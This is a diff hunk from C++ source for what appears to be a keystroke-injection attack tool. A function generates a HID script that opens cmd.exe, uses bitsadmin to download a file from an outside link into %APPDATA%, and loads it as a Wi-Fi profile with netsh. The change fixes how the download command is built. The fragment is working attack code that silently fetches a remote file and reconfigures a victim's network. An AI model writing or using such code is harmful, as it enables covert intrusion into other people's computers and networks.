@@ -248,7 +248,7 @@ void genHIDeternal(string SSID){
     hid<<"STRING cmd.exe"<<endl;
     hid<<"ENTER"<<endl;
     hid<<"DELAY 100"<<endl;
-    hid<<"STRING bitsadmin /transfer debjob /download /priority normal "<<link<<"/"+name_file+" %APPDATA%\\"+name_file<<endl;
+    hid<<"STRING bitsadmin /transfer debjob /download /priority normal "+link+"/"+name_file+" %APPDATA%\\"+name_file<<endl;
     hid<<"ENTER"<<endl;
     hid<<"DELAY 5000"<<endl;
     hid<<"STRING netsh wlan add profile filename=%APPDATA%\\"<<name_file<<endl;
